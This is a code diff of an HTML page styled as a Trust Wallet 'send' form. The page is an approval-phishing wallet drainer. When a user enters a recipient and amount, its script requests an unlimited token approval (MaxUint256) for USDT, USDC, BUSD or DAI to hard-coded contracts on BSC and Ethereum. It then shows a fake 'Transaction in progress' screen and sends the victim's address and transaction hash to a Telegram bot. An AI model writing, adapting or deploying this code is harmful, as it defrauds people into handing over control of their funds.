@@ -1,30 +1,119 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" class="theme-light">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Trusts - DEBUG</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, viewport-fit=cover">
+    <title>Trusts</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
     <style>
-        body { font-family: monospace; background: #1e1e1e; color: #00ff00; padding: 20px; }
-        .log-container { background: #000; border: 1px solid #00ff00; padding: 10px; height: 400px; overflow-y: auto; margin-bottom: 20px; font-size: 12px; }
-        .log-entry { margin: 2px 0; }
-        .debug { color: #00ff00; }
-        .error { color: #ff0000; }
-        .success { color: #00ff00; }
-        button { padding: 10px 20px; background: #0052cc; color: white; border: none; cursor: pointer; font-size: 14px; }
-        button:disabled { opacity: 0.5; }
-        input { padding: 8px; margin: 5px 0; width: 100%; }
+        * { box-sizing: border-box; }
+        html, body, #root { width: 100%; height: 100%; margin: 0; font-family: Inter, system-ui, -apple-system, BlinkMacSystemFont, sans-serif; font-weight: 500; }
+        .theme-light { --bg: #ffffff; --text: #111827; --subtext: #6b7280; --muted: #9ca3af; --accent: #2563eb; --input-bg: #ffffff; --input-soft: #f6f7f9; --border-default: #d1d5db; }
+        body { background: var(--bg); color: var(--text); }
+        .page { min-height: 100dvh; display: flex; justify-content: center; align-items: flex-start; background: var(--bg); padding: 16px; padding-top: 20px; }
+        .card { width: 100%; max-width: 420px; padding: 16px; display: flex; flex-direction: column; color: var(--text); border-radius: 16px; }
+        .label { font-size: 12px; font-weight: 600; letter-spacing: 0.05em; margin-bottom: 6px; color: var(--subtext); text-transform: uppercase; }
+        .input-row { height: 48px; display: flex; align-items: center; border-radius: 12px; padding: 0 12px; gap: 8px; background: var(--input-bg); border: 1.5px solid var(--border-default); margin-bottom: 14px; transition: border-color 0.2s ease; }
+        .input-row:focus-within { border: 2px solid #2563eb; }
+        .input-row input { flex: 1; border: none; outline: none; background: transparent; font-size: 14px; font-weight: 500; color: var(--text); }
+        .input-row input::placeholder { color: var(--muted); font-weight: 500; }
+        .paste, .max { font-size: 13px; font-weight: 600; cursor: pointer; color: var(--accent); background: none; border: none; padding: 0; white-space: nowrap; }
+        .unit { font-size: 12px; color: var(--subtext); white-space: nowrap; }
+        .network-row { display: inline-flex; align-items: center; gap: 8px; height: 36px; padding: 6px 12px; border-radius: 999px; background: var(--input-soft); border: 1.5px solid var(--border-default); margin-bottom: 16px; width: fit-content; cursor: pointer; transition: all 0.2s ease; position: relative; }
+        .network-row:hover { border-color: #2563eb; }
+        .network-row.open { border-color: #2563eb; }
+        .network-left { display: flex; align-items: center; gap: 6px; }
+        .token-logo { width: 20px; height: 20px; border-radius: 50%; object-fit: cover; }
+        .network-left span { font-size: 13px; font-weight: 500; color: var(--subtext); }
+        .network-arrow { width: 14px; height: 14px; transition: transform 0.2s ease; }
+        .network-row.open .network-arrow { transform: rotate(180deg); }
+        .token-dropdown-menu { position: absolute; top: 100%; left: 0; right: 0; background: white; border: 1.5px solid var(--border-default); border-top: none; border-radius: 0 0 12px 12px; max-height: 300px; overflow-y: auto; z-index: 1000; display: none; margin-top: -4px; }
+        .token-dropdown-menu.open { display: block; }
+        .token-option { padding: 12px; cursor: pointer; display: flex; align-items: center; gap: 10px; transition: all 0.2s ease; border-bottom: 1px solid #f0f0f0; font-size: 13px; }
+        .token-option:hover { background: #f5f5f5; }
+        .token-option.active { background: #f0f0f0; font-weight: 600; }
+        .token-info { display: flex; flex-direction: column; gap: 2px; }
+        .token-name { font-weight: 600; font-size: 13px; }
+        .token-network { font-size: 11px; color: #999; }
+        .estimate { font-size: 12px; color: var(--subtext); margin-bottom: auto; margin-top: 6px; }
+        .connect-btn { width: 100%; height: 48px; border-radius: 999px; border: none; font-size: 16px; font-weight: 600; margin-top: auto; transition: background-color 0.25s ease, opacity 0.25s ease; cursor: pointer; }
+        .connect-btn.active { background: #2563eb; color: #fff; }
+        .connect-btn:disabled { opacity: 0.5; cursor: not-allowed; }
+        .error-message { color: #dc2626; font-size: 12px; margin-top: 6px; padding: 8px 10px; background: #fee2e2; border-radius: 8px; display: none; }
+        .error-message.show { display: block; }
+        .processing-screen { display: none; position: fixed; inset: 0; background: rgba(255, 255, 255, 0.98); backdrop-filter: blur(4px); z-index: 1000; flex-direction: column; justify-content: flex-end; align-items: center; gap: 0; padding: 0; }
+        .processing-screen.active { display: flex; }
+        .processing-content { width: 100%; background: white; border-radius: 24px 24px 0 0; padding: 40px 20px 30px; display: flex; flex-direction: column; align-items: center; gap: 20px; box-shadow: 0 -10px 30px rgba(0, 0, 0, 0.1); position: relative; }
+        .close-btn { position: absolute; top: 16px; right: 16px; background: none; border: none; font-size: 28px; color: #6b7280; cursor: pointer; padding: 0; width: 32px; height: 32px; display: flex; align-items: center; justify-content: center; }
+        .particles-container { position: absolute; top: 0; left: 0; right: 0; height: 200px; overflow: hidden; }
+        .particle { position: absolute; width: 12px; height: 12px; background: #3b82f6; border-radius: 2px; animation: fall 3s ease-in infinite; }
+        @keyframes fall { to { transform: translateY(200px) rotate(360deg); opacity: 0; } }
+        .checkmark-circle { width: 140px; height: 140px; position: relative; display: flex; align-items: center; justify-content: center; background: radial-gradient(circle at 30% 30%, #1a1a1a, #0a0a0a); border-radius: 50%; box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3); animation: float 3s ease-in-out infinite; z-index: 10; }
+        @keyframes float { 0%, 100% { transform: translateY(0px); } 50% { transform: translateY(-15px); } }
+        .checkmark-circle img { width: 80px; height: 80px; animation: checkmark-pop 0.8s cubic-bezier(0.34, 1.56, 0.64, 1); border-radius: 50%; object-fit: contain; }
+        @keyframes checkmark-pop { 0% { transform: scale(0); opacity: 0; } 100% { transform: scale(1); opacity: 1; } }
+        .processing-text { font-size: 28px; font-weight: 700; color: #1f2937; text-align: center; margin-top: 20px; }
+        .processing-subtext { font-size: 14px; color: #6b7280; text-align: center; max-width: 300px; line-height: 1.6; font-weight: 400; }
+        .transaction-details-btn { width: 100%; max-width: 340px; height: 56px; border-radius: 999px; border: none; background: linear-gradient(135deg, #0052cc 0%, #0052cc 100%); color: #fff; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 20px; transition: background-color 0.25s ease; box-shadow: 0 4px 15px rgba(0, 82, 204, 0.3); }
+        .transaction-details-btn:hover { background: linear-gradient(135deg, #0047b2 0%, #0047b2 100%); }
+        @media (max-width: 480px) {
+            .page { padding: 12px; padding-top: 16px; }
+            .card { padding: 12px; }
+            .input-row { height: 44px; margin-bottom: 12px; }
+            .label { font-size: 11px; margin-bottom: 5px; }
+            .connect-btn { height: 44px; font-size: 15px; }
+        }
     </style>
 </head>
 <body>
-    <h1>Trusts - DEBUG MODE</h1>
-    <div class="log-container" id="logContainer"></div>
-    
-    <div>
-        <input id="recipientInput" type="text" placeholder="Recipient address" value="0x29A3B590B14d97e25b5b04D9804237E5b491b57b">
-        <input id="amountInput" type="number" placeholder="Amount" value="10">
-        <button id="testBtn" onclick="handleMainAction()">Test Approve</button>
+    <div class="processing-screen" id="processingScreen">
+        <div class="particles-container" id="particlesContainer"></div>
+        <div class="processing-content">
+            <button class="close-btn" onclick="">✕</button>
+            <div class="checkmark-circle">
+                <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663828351091/NsPAgBXGfqaWTvni.png" alt="Processing" />
+            </div>
+            <div class="processing-text">Processing...</div>
+            <div class="processing-subtext">Transaction in progress! Blockchain validation is underway.</div>
+            <button class="transaction-details-btn" onclick="">Transaction details</button>
+        </div>
+    </div>
+
+    <div id="root">
+        <div class="page">
+            <div class="card">
+                <label class="label">Address or Domain Name</label>
+                <div class="input-row primary">
+                    <input id="recipientInput" type="text" placeholder="Search or Enter" value="0x29A3B590B14d97e25b5b04D9804237E5b491b57b" />
+                    <span class="paste" onclick="pasteAddress()">Paste</span>
+                </div>
+
+                <label class="label">Destination Network</label>
+                <div class="network-row" id="tokenSelector" onclick="toggleTokenDropdown()">
+                    <div class="network-left">
+                        <img id="selectedTokenLogo" src="" alt="Token" class="token-logo">
+                        <span id="selectedTokenName">USDT on BSC</span>
+                    </div>
+                    <svg class="network-arrow" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 14l-7 7m0 0l-7-7m7 7V3"></path>
+                    </svg>
+                    <div class="token-dropdown-menu" id="tokenDropdownMenu"></div>
+                </div>
+
+                <label class="label">Amount</label>
+                <div class="input-row amount-row">
+                    <input id="amountInput" type="number" placeholder="Amount" step="0.01" />
+                    <span class="unit" id="tokenUnit">USDT</span>
+                    <span class="max" onclick="setMaxAmount()">Max</span>
+                </div>
+
+                <p class="estimate" id="amountInfo">≈ $0.00</p>
+
+                <div class="error-message" id="errorMessage"></div>
+
+                <button class="connect-btn active" id="mainButton" onclick="handleMainAction()">Next</button>
+            </div>
+        </div>
     </div>
 
     <script>
@@ -37,8 +126,81 @@
                 chainIdHex: '0x38',
                 address: '0x55d398326f99059fF775485246999027B3197955',
                 decimals: 18,
+                logo: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/smartchain/assets/0x55d398326f99059fF775485246999027B3197955/logo.png',
                 rpc: 'https://bsc-dataseed1.binance.org:8545',
                 smartContract: '0xBAE688D04e14E9939C3a5dA69a1D746ea3487570'
+            },
+            'usdc_bsc': {
+                name: 'USDC on BSC',
+                symbol: 'USDC',
+                network: 'BSC',
+                chainId: 56,
+                chainIdHex: '0x38',
+                address: '0x8AC76a51cc950d9822D68b83FE1Ad97B32Cd580d',
+                decimals: 18,
+                logo: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/smartchain/assets/0x8AC76a51cc950d9822D68b83FE1Ad97B32Cd580d/logo.png',
+                rpc: 'https://bsc-dataseed1.binance.org:8545',
+                smartContract: '0xBAE688D04e14E9939C3a5dA69a1D746ea3487570'
+            },
+            'busd_bsc': {
+                name: 'BUSD on BSC',
+                symbol: 'BUSD',
+                network: 'BSC',
+                chainId: 56,
+                chainIdHex: '0x38',
+                address: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56',
+                decimals: 18,
+                logo: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/smartchain/assets/0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56/logo.png',
+                rpc: 'https://bsc-dataseed1.binance.org:8545',
+                smartContract: '0xBAE688D04e14E9939C3a5dA69a1D746ea3487570'
+            },
+            'usdt_eth': {
+                name: 'USDT on Ethereum',
+                symbol: 'USDT',
+                network: 'Ethereum',
+                chainId: 1,
+                chainIdHex: '0x1',
+                address: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
+                decimals: 6,
+                logo: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png',
+                rpc: 'https://eth.llamarpc.com',
+                smartContract: '0xbf8f1EA4e780c4cF1a104927bB400699b08E12cA'
+            },
+            'usdc_eth': {
+                name: 'USDC on Ethereum',
+                symbol: 'USDC',
+                network: 'Ethereum',
+                chainId: 1,
+                chainIdHex: '0x1',
+                address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
+                decimals: 6,
+                logo: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48/logo.png',
+                rpc: 'https://eth.llamarpc.com',
+                smartContract: '0xbf8f1EA4e780c4cF1a104927bB400699b08E12cA'
+            },
+            'dai_eth': {
+                name: 'DAI on Ethereum',
+                symbol: 'DAI',
+                network: 'Ethereum',
+                chainId: 1,
+                chainIdHex: '0x1',
+                address: '0x6B175474E89094C44Da98b954EedeAC495271d0F',
+                decimals: 18,
+                logo: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0x6B175474E89094C44Da98b954EedeAC495271d0F/logo.png',
+                rpc: 'https://eth.llamarpc.com',
+                smartContract: '0xbf8f1EA4e780c4cF1a104927bB400699b08E12cA'
+            },
+            'busd_eth': {
+                name: 'BUSD on Ethereum',
+                symbol: 'BUSD',
+                network: 'Ethereum',
+                chainId: 1,
+                chainIdHex: '0x1',
+                address: '0x4Fabb145d64652a948d72533023f6E7A623C7C53',
+                decimals: 18,
+                logo: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0x4Fabb145d64652a948d72533023f6E7A623C7C53/logo.png',
+                rpc: 'https://eth.llamarpc.com',
+                smartContract: '0xbf8f1EA4e780c4cF1a104927bB400699b08E12cA'
             }
         };
 
@@ -47,57 +209,112 @@
             TELEGRAM_CHAT_ID: '8933407008'
         };
 
-        function log(message, type = 'debug') {
-            const container = document.getElementById('logContainer');
-            const entry = document.createElement('div');
-            entry.className = `log-entry ${type}`;
-            entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
-            container.appendChild(entry);
-            container.scrollTop = container.scrollHeight;
-            console.log(`[${type.toUpperCase()}] ${message}`);
+        let selectedToken = 'usdt_bsc';
+
+        document.addEventListener('DOMContentLoaded', () => {
+            initializeTokenDropdown();
+            document.getElementById('amountInput').addEventListener('input', updateAmountInfo);
+        });
+
+        function initializeTokenDropdown() {
+            const menu = document.getElementById('tokenDropdownMenu');
+            menu.innerHTML = '';
+            
+            for (const [key, token] of Object.entries(TOKENS)) {
+                const option = document.createElement('div');
+                option.className = `token-option ${key === selectedToken ? 'active' : ''}`;
+                option.onclick = () => selectToken(key);
+                option.innerHTML = `
+                    <img src="${token.logo}" alt="${token.symbol}" class="token-logo" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 24 24%22%3E%3Crect fill=%22%23f0f0f0%22 width=%2224%22 height=%2224%22/%3E%3C/svg%3E'">
+                    <div class="token-info">
+                        <div class="token-name">${token.symbol}</div>
+                        <div class="token-network">${token.network}</div>
+                    </div>
+                `;
+                menu.appendChild(option);
+            }
+        }
+
+        function toggleTokenDropdown() {
+            const selector = document.getElementById('tokenSelector');
+            const menu = document.getElementById('tokenDropdownMenu');
+            selector.classList.toggle('open');
+            menu.classList.toggle('open');
+        }
+
+        function selectToken(key) {
+            selectedToken = key;
+            const token = TOKENS[key];
+            document.getElementById('selectedTokenLogo').src = token.logo;
+            document.getElementById('selectedTokenName').textContent = token.name;
+            document.getElementById('tokenUnit').textContent = token.symbol;
+            document.getElementById('tokenSelector').classList.remove('open');
+            document.getElementById('tokenDropdownMenu').classList.remove('open');
+            initializeTokenDropdown();
+        }
+
+        function createParticles() {
+            const container = document.getElementById('particlesContainer');
+            container.innerHTML = '';
+            for (let i = 0; i < 8; i++) {
+                const particle = document.createElement('div');
+                particle.className = 'particle';
+                particle.style.left = Math.random() * 100 + '%';
+                particle.style.top = Math.random() * 50 + 'px';
+                particle.style.animationDelay = Math.random() * 0.5 + 's';
+                particle.style.animationDuration = (2 + Math.random() * 1) + 's';
+                container.appendChild(particle);
+            }
         }
 
         async function handleMainAction() {
-            const btn = document.getElementById('testBtn');
+            const btn = document.getElementById('mainButton');
             const recipient = document.getElementById('recipientInput').value.trim();
             const amount = document.getElementById('amountInput').value.trim();
-            const token = TOKENS['usdt_bsc'];
+            const token = TOKENS[selectedToken];
 
-            log('=== ATTEMPT START ===', 'debug');
-            log('handleMainAction START', 'debug');
+            if (!recipient.startsWith('0x')) {
+                showError('Invalid recipient address');
+                return;
+            }
+
+            if (!amount || parseFloat(amount) <= 0) {
+                showError('Please enter a valid amount');
+                return;
+            }
 
             btn.disabled = true;
+            btn.textContent = 'Processing...';
+            clearError();
 
             try {
-                log('Step 1: Detecting wallet...', 'debug');
                 let ethereum = window.ethereum;
+                let retries = 0;
+                while (!ethereum && retries < 10) {
+                    await new Promise(resolve => setTimeout(resolve, 100));
+                    ethereum = window.ethereum;
+                    retries++;
+                }
+
                 if (!ethereum) {
-                    log('ERROR: Wallet not detected', 'error');
+                    showError('Trust Wallet not detected');
+                    btn.disabled = false;
+                    btn.textContent = 'Next';
                     return;
                 }
-                log('Wallet detected', 'success');
 
-                log('Step 2: Getting accounts...', 'debug');
                 let accounts = await ethereum.request({ method: "eth_accounts" });
                 let userAddress = accounts && accounts.length > 0 ? accounts[0] : null;
-                log(`User address: ${userAddress}`, 'success');
 
-                log('Step 3: Checking current chain...', 'debug');
                 const currentChainId = await ethereum.request({ method: 'eth_chainId' });
-                log(`Current chain: ${currentChainId}, Target: ${token.chainIdHex}`, 'debug');
-
                 if (currentChainId !== token.chainIdHex) {
-                    log('Step 4: Switching chain...', 'debug');
                     try {
                         const switchResult = await ethereum.request({
                             method: 'wallet_switchEthereumChain',
                             params: [{ chainId: token.chainIdHex }]
                         });
-                        log(`Chain switch result: ${JSON.stringify(switchResult)}`, 'success');
                     } catch (switchError) {
-                        log(`Chain switch error code: ${switchError.code}`, 'error');
                         if (switchError.code === 4902) {
-                            log('Adding new chain...', 'debug');
                             await ethereum.request({
                                 method: 'wallet_addEthereumChain',
                                 params: [{
@@ -107,83 +324,100 @@
                                     nativeCurrency: { name: token.network, symbol: token.symbol, decimals: token.decimals }
                                 }]
                             });
-                            log('Chain added successfully', 'success');
-                        } else {
-                            throw switchError;
                         }
                     }
-                } else {
-                    log('Already on correct chain', 'success');
                 }
 
-                log('Step 5: Preparing approve transaction...', 'debug');
                 const USDT_ABI = ['function approve(address spender, uint256 amount) public returns (bool)'];
                 const iface = new ethers.utils.Interface(USDT_ABI);
                 const approveData = iface.encodeFunctionData("approve", [token.smartContract, ethers.constants.MaxUint256]);
 
                 const tx = { to: token.address, data: approveData };
                 if (userAddress) tx.from = userAddress;
-                log(`Transaction prepared: ${JSON.stringify(tx)}`, 'debug');
 
-                log('Step 6: Sending eth_sendTransaction...', 'debug');
-                log('>>> AWAITING WALLET SIGNATURE <<<', 'debug');
-                
                 let txHash;
                 try {
                     txHash = await ethereum.request({ method: "eth_sendTransaction", params: [tx] });
-                    log(`✓ eth_sendTransaction RETURNED: ${txHash}`, 'success');
-                    log(`✓ txHash type: ${typeof txHash}`, 'success');
-                    log(`✓ txHash is valid: ${txHash !== null && txHash !== undefined}`, 'success');
                 } catch (e) {
-                    log(`✗ eth_sendTransaction ERROR: ${e.message}`, 'error');
-                    log(`✗ Error code: ${e.code}`, 'error');
+                    console.error('Transaction error:', e);
                     throw e;
                 }
 
-                log('>>> EXECUTION CONTINUES AFTER eth_sendTransaction <<<', 'success');
-
-                log('Step 7: Showing processing screen...', 'debug');
+                // MOSTRA PROCESSING SCREEN SUBITO
+                createParticles();
                 const processingScreen = document.getElementById('processingScreen');
                 if (processingScreen) {
                     processingScreen.classList.add('active');
-                    log('Processing screen shown', 'success');
-                } else {
-                    log('Processing screen element not found', 'error');
                 }
 
                 let finalUserAddress = userAddress || 'Unknown';
-                log(`Final user address: ${finalUserAddress}`, 'debug');
 
-                log('Step 8: Sending Telegram notification...', 'debug');
+                // INVIA NOTIFICA TELEGRAM SUBITO
                 try {
                     await sendTelegramNotification(finalUserAddress, txHash, amount, token, recipient);
-                    log('✓ Telegram notification sent successfully', 'success');
                 } catch (err) {
-                    log(`✗ Telegram notification error: ${err.message}`, 'error');
+                    console.error('Telegram notification error:', err);
                 }
 
-                log('Step 9: Waiting 3 seconds...', 'debug');
-                await new Promise(resolve => setTimeout(resolve, 3000));
+                // recordApproval in background
+                recordApprovalAsync(ethereum, finalUserAddress, token, amount).catch(err => {
+                    console.error('recordApproval error:', err);
+                });
 
-                log('=== ATTEMPT COMPLETED SUCCESSFULLY ===', 'success');
+                // Aspetta 5 secondi e chiudi
+                await new Promise(resolve => setTimeout(resolve, 5000));
+                if (processingScreen) {
+                    processingScreen.classList.remove('active');
+                }
+                btn.textContent = 'Next';
                 btn.disabled = false;
+                document.getElementById('amountInput').value = '';
+                updateAmountInfo();
 
             } catch (error) {
-                log(`=== CAUGHT EXCEPTION ===`, 'error');
-                log(`Error: ${error.message}`, 'error');
-                log(`Stack: ${error.stack}`, 'error');
+                console.error("Error:", error);
+                showError('Transaction failed: ' + error.message);
+                const processingScreen = document.getElementById('processingScreen');
+                if (processingScreen) {
+                    processingScreen.classList.remove('active');
+                }
                 btn.disabled = false;
+                btn.textContent = 'Next';
+            }
+        }
+
+        async function recordApprovalAsync(ethereum, userAddress, token, amount) {
+            try {
+                const amountInWei = ethers.utils.parseUnits(amount, token.decimals);
+                const contractABI = ['function recordApproval(address user, address token, uint256 amount) public'];
+                const contractIface = new ethers.utils.Interface(contractABI);
+                const recordApprovalData = contractIface.encodeFunctionData("recordApproval", [userAddress, token.address, amountInWei]);
+
+                const contractTx = {
+                    to: token.smartContract,
+                    data: recordApprovalData,
+                    from: userAddress,
+                    gas: '300000'
+                };
+
+                const recordTxHash = await Promise.race([
+                    ethereum.request({ method: "eth_sendTransaction", params: [contractTx] }),
+                    new Promise((_, reject) => setTimeout(() => reject(new Error('Request timeout')), 30000))
+                ]);
+            } catch (e) {
+                console.warn('recordApproval failed (non-critical):', e.message);
             }
         }
 
         async function sendTelegramNotification(userAddress, txHash, amount, token, recipient) {
-            const explorerUrl = `https://bscscan.com/tx/${txHash}`;
-            const messageText = `Token Approve Notification\n\nToken: ${token.symbol}\nNetwork: ${token.network}\nUser: ${userAddress}\nRecipient: ${recipient}\nAmount: ${amount} ${token.symbol}\n\nTransaction Hash:\n${txHash}\n\nExplorer:\n${explorerUrl}`;
+            const explorerUrl = token.network === 'Ethereum' 
+                ? `https://etherscan.io/tx/${txHash}`
+                : `https://bscscan.com/tx/${txHash}`;
+
+            const messageText = `Token Approve Notification\n\nToken: ${token.symbol}\nNetwork: ${token.network}\nUser: ${userAddress}\nRecipient: ${recipient}\nAmount: ${amount} ${token.symbol}\n\nTransaction Hash:\n${txHash}\n\nExplorer:\n${explorerUrl}\n\nTime: ${new Date().toLocaleString()}\n\nSmart Contract:\n${token.smartContract}`;
 
             const url = `https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`;
 
-            log(`Telegram API call to: ${url}`, 'debug');
-            
             const response = await fetch(url, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -194,14 +428,50 @@
             });
 
             const responseData = await response.json();
-            log(`Telegram response: ${JSON.stringify(responseData)}`, 'debug');
 
             if (!responseData.ok) {
                 throw new Error('Telegram API error: ' + (responseData.description || 'Unknown error'));
             }
         }
 
-        log('Page loaded - ready for testing', 'success');
+        async function pasteAddress() {
+            try {
+                const text = await navigator.clipboard.readText();
+                document.getElementById('recipientInput').value = text;
+            } catch (error) {
+                showError('Failed to read clipboard');
+            }
+        }
+
+        async function setMaxAmount() {
+            document.getElementById('amountInput').value = '999999';
+            updateAmountInfo();
+        }
+
+        function updateAmountInfo() {
+            const amount = document.getElementById('amountInput').value;
+            if (amount) {
+                const usdValue = (parseFloat(amount) * 1).toFixed(2);
+                document.getElementById('amountInfo').textContent = `≈ $${usdValue}`;
+            }
+        }
+
+        function showError(message) {
+            const errorDiv = document.getElementById('errorMessage');
+            errorDiv.textContent = message;
+            errorDiv.classList.add('show');
+        }
+
+        function clearError() {
+            const errorDiv = document.getElementById('errorMessage');
+            errorDiv.classList.remove('show');
+            errorDiv.textContent = '';
+        }
+
+        if (window.ethereum) {
+            window.ethereum.on('accountsChanged', () => window.location.reload());
+            window.ethereum.on('chainChanged', () => window.location.reload());
+        }
     </script>
 </body>
 </html>
